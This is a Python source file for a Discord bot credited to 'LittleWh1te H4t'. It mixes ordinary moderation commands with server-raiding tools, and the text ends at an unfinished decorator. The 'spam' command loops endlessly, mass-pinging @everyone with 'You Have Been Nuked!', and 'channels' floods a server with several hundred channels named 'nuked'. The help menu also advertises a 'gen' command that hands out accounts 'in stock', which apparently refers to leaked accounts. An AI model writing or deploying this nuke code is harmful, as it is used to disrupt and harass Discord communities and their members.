import discord
from discord.ext import commands
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
import random
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
from discord.utils import get
import urllib.parse, urllib.request, re
import itertools
import copy
from collections import Counter, OrderedDict
import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
 
start_time = time.time()
 
bot=commands.Bot(command_prefix='*')
 
client = commands.Bot(command_prefix = '*')
 
bot.remove_command('help')
 
ROLE = "muted" or "Muted"
 
 
 
 
 
@bot.event
async def on_ready():
   print('---------------------')
   print('The bot is ready!')
   print(bot.user.name)
   print(bot.user.id)
   print('---------------------')
   await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="Dm for selfbots 😉"))
 
 
 
@bot.command()
async def help(ctx):
       embed2 = discord.Embed(
           colour=discord.Colour.red(),
           title="Commands sent to your dm/pms succesfully!",
           description="Please check your dm/pms!"
       )
       await ctx.send(embed=embed2)
       embed = discord.Embed(
               colour=discord.Colour.blue(),
               title="help",
               description="Shows this message"
       )
       embed.set_author(name="Commands")
       embed.add_field(name="ping", value="Pong!", inline=False)
       embed.add_field(name="ban", value="Bans a member", inline=False)
       embed.add_field(name="kick", value="Kicks a member", inline=False)
       embed.add_field(name="Dev", value="Shows who made the code", inline=False)
       embed.add_field(name="ytsearch", value="This searches and gives results of youtube, only gives 2 results so not to spam! So please try be a little specific.", inline=False)
       embed.add_field(name="unban", value="Unbans a user! example how to use ^unban Test#3333", inline=False)
       embed.add_field(name="info", value="Gets user info", inline=False)
       embed.add_field(name="echo", value="Echos whatever you say.", inline=False)
       embed.add_field(name="purge", value="Deletes messages with an amount.", inline=False)
       embed.add_field(name="nick", value="Nicknames someone", inline=False)
       embed.add_field(name="mute", value="Mutes a member", inline=False)
       embed.add_field(name="unmute", value="UnMutes a member", inline=False)
       embed.add_field(name="uptime", value="Shows the amount of time its been online", inline=False)
       embed.add_field(name="spam", value="Nukes and @everyones's", inline=False)
       embed.add_field(name="chanels", value="Nukes the channels", inline=False)
       embed.add_field(name="embed", value="sends a message in embed", inline=False)
       embed.add_field(name="poll", value="Creates a poll for voting", inline=False)
       embed.add_field(name="gen", value="Generates an account for what ever is in stock", inline=False)
       embed.add_field(name="botinfo", value="Shows the bots info", inline=False)
       embed.add_field(name="serverinfo", value="shows the servers info", inline=False)
       embed.add_field(name="avatar", value="Shows the persons avatar", inline=False)
       embed.set_footer(text="Made by LittleWh1te H4t")
 
 
       await ctx.author.send(embed=embed)
 
 
@bot.command(pass_context=True)
@commands.has_role("Admin")
async def ban(ctx, member : discord.Member, *, reason=None):
   await member.ban(reason=reason)
   await ctx.message.delete()
   await ctx.send('Ban success!')
   await ctx.send(f'{member} has been banned!')
   print(f"{member} was banned by {ctx.author.mention}!")
@bot.command(pass_context=True)
@commands.has_role("Admin")
async def kick(ctx, member : discord.Member, * , reason=None):
       await member.kick(reason=reason)
       await ctx.message.delete()
       await ctx.send('Kick success!')
       await ctx.send(f'{member} has been kicked!')
       print(f"{member} was kicked by {ctx.author.mention}!")
@bot.command()
async def Dev(ctx):
       await ctx.message.delete()
       embed = discord.Embed(
               colour=discord.Colour.red(),
               title="Developers",
               description="The developers of this bot are LittleWh1te H4t, aka Invalid-user"
       )
       embed.set_author(name="Invalids Self Bot", icon_url="https://cdn.discordapp.com/attachments/594372156209758226/604968187624161290/download.jpg")
       await ctx.send(embed=embed)
 
@bot.command(pass_context=True)
async def spam(ctx):
   await ctx.message.delete()
   while True:
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
       await ctx.send("You Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-nYou Have Been Nuked!@everyone+AFw-n")
 
@bot.command(pass_context=True)
async def channels(ctx):
   await ctx.message.delete()
   guild = ctx.message.guild
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
   await guild.create_text_channel('nuked')
 
@bot.command()
async def ytsearch(ctx, *, search):
 
       query_string = urllib.parse.urlencode({
               'search_query': search
       })
       htm_content = urllib.request.urlopen(
               'http://www.youtube.com/results?' + query_string
       )
       search_results = re.findall('href=\"\\/watch\\?v=(.{11})', htm_content.read().decode())
       await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])
       await ctx.send('http://www.youtube.com/watch?v=' + search_results[2])
       await ctx.send('This cmd is set to 2 results only so not to spam, please be more specific if you did not get what you wanted')
@bot.command()
@commands.has_role("Admin")
async def unban(ctx, *, member):
       await ctx.message.delete()
       banned_users = await ctx.guild.bans()
       member_name, member_discriminator = member.split('#')
 
       for ban_entry in banned_users:
               user = ban_entry.user
 
               if (user.name, user.discriminator) == (member_name, member_discriminator):
                       await ctx.guild.unban(user)
                       await ctx.send(f'Unbanned {member}')
                       print(f'Unbanned {member} by {ctx.author.mention}')
                       return
@bot.command()
@commands.has_role("Admin")
async def purge(ctx, amount=1000):
   await ctx.channel.purge(limit=amount + 1)
   await ctx.send("Deleted messages.")
   await asyncio.sleep(3)
   await ctx.channel.purge(limit=1)
 
@bot.command()
async def ping(ctx):
   embed = discord.Embed(
               colour=discord.Colour.green(),
               title="Pinging..."
       )
   embed.add_field(name=":ping_pong: Pong!:", value=f"Pinged **{round(bot.latency * 1000)}ms**.")
   await ctx.send(embed=embed)
 
 
@bot.command()
async def embed(ctx, *args):
   output = ''
   for word in args:
       output += word
       output += ' '
   embed = discord.Embed(
       colour = discord.Colour.blue()
   )
   embed.set_author(name=ctx.message.author)
   embed.add_field(name='Embed', value=output)
   embed.set_footer(text='Time:')
 
   await ctx.send(embed=embed)
   await ctx.message.delete()
@bot.command()
async def invite(ctx):
   embed = discord.Embed(
       colour = discord.Colour.purple()
   )
   embed.set_author(name="Here you go, enjoy!")
   embed.add_field(name="Invite link", value="http://bit.ly/LittleWh1teB0t")
   await ctx.send(embed=embed)
@bot.command()
async def echo(ctx, *args):
   output = ''
   for word in args:
       output += word
       output += ' '
   await ctx.send(output)
   await ctx.message.delete()
@bot.command()
async def status(ctx, *args):
   if ctx.message.author.id == 441212840410611722 or ctx.message.author.id == 394227514786185217 or ctx.message.author.id == 456678423625072683:
       output = ''
       for word in args:
           output += word
           output += ' '
           await bot.change_presence(status=discord.Status.idle, activity=discord.Game(name=output))
@bot.command(pass_context = True)
async def staff(ctx):
 
   if not ctx.message.author.server_permissions.administrator:
       await ctx.send("permission denied")
   else:
       await ctx.send('permission granted')
@bot.command()
@commands.has_role("Admin")
async def poll(ctx, *args):
 
   if not ctx.message.author.server_permissions.administrator:
       await ctx.send("permission denied")
   else:
       question = ''
   for word in args:
       question += word
       question += ' '
   await ctx.channel.purge(limit=1)
   await ctx.send("@everyone")
   embed = discord.Embed(
       colour = discord.Colour.purple()
   )
   embed.set_author(name="Poll")
   embed.add_field(name="Question", value=question, inline=False)
   embed.set_footer(text="👍 for Yes, 👎 for No.")
   await ctx.send(embed=embed)
@bot.command()
@commands.has_role("Admin")
async def nick(ctx, user: discord.Member, nickname):
   embed = discord.Embed()
   embed.set_author(name=f"Changed {user}s NickName")
   await user.edit(nick=nickname)
   await ctx.send(embed=embed)
@bot.command()
